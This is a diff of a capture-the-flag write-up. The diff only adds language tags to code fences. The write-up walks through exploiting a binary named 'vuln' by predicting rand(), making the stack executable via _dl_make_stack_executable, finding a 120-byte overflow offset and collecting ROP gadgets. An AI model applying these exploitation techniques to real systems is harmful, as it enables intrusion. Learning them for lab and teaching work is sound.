@@ -4,13 +4,13 @@
 
 We could brute-force to guess the number, or since function ``get_random`` takes a number generated with unseed rand as return, so we could load ``libc`` and call ``rand`` to generate such a number.
 
-```
+```python
 num = (libc.rand() % 100) + 1
 ```
 
 ## Make stack executable
 
-```
+```bash
 checksec --file ./vuln
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./vuln
@@ -20,7 +20,7 @@ Since the program is NX enabled, we can't simply execute code from stack. To inj
 
 Run ``nm`` on the program, we found an interesting function ``_dl_make_stack_executable``, which allow us to set permission on stack.
 
-```
+```asm
 ...
 0000000000480860 T _dl_make_stack_executable
 ...
@@ -28,7 +28,7 @@ Run ``nm`` on the program, we found an interesting function ``_dl_make_stack_exe
 
 Disassamble with ``radare2``.
 
-```
+```bash
 $ r2 vuln
  -- Your problems are solved in an abandoned branch somewhere
  [0x00400a40]> pd $s
@@ -36,7 +36,7 @@ $ r2 vuln
 
 ``_dl_make_stack_executable`` takes ``__libc_stack_end`` as parameter and call ``mprotect`` with parameter ``__stack_prot``. 
 
-```
+```asm
             ;-- _dl_make_stack_executable:
             0x00480860      488b3591a923.  mov rsi, qword [obj._dl_pagesize] ; [0x6bb1f8:8]=0x1000
             0x00480867      53             push rbx
@@ -59,7 +59,7 @@ $ r2 vuln
 
 We need to set ``__stack_prot`` to *7*, meaning *PROT_READ|PROT_WRITE|PROT_EXEC*, and then call ``_dl_make_stack_executable`` with address of ``__libc_stack_end`` to make stack executable.
 
-```
+```c
 #define PROT_READ  0x1    /* page can be read */
 #define PROT_WRITE  0x2   /* page can be written */
 #define PROT_EXEC 0x4     /* page can be executed */
@@ -71,14 +71,14 @@ So the payload would be ``padding + set __stack_prot to 7 + set rdi to __libc_st
 
 Set a breakpoint in main and run the program.
 
-```
+```bash
 gef➤  break main
 gef➤  r
 ```
 
 Now try to call ``win`` with generated patter to cause segfault.
 
-```
+```bash
 gef➤  pattern create 150                                                                                                                     [58/1898]
 [+] Generating a pattern of 150 bytes                                                                                                                 
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
@@ -145,7 +145,7 @@ When the function is done executing, GDB will silently stop.
 
 Check the registers, noticed the pattern in ``$rsp``. Search the pattern and find out padding is 120.
 
-```
+```bash
 gef➤  registers 
 $rax   : 0xa2              
 $rbx   : 0x00000000006ba580  →  0x00000000fbad2288
@@ -178,13 +178,13 @@ gef➤
 
 Run ``ROPgadget`` to print all the gadges in ``vuln``.
 
-```
+```bash
 ROPgadget --binary ./vuln
 ```
 
 ``ROP.find_gadget`` in ``pwntools`` is convinient, but some gadgets might be missing in gadget list, we could still manually add them.
 
-```
+```bash
 ...
 0x0000000000419127 : mov qword ptr [rdx], rax ; ret
 ...
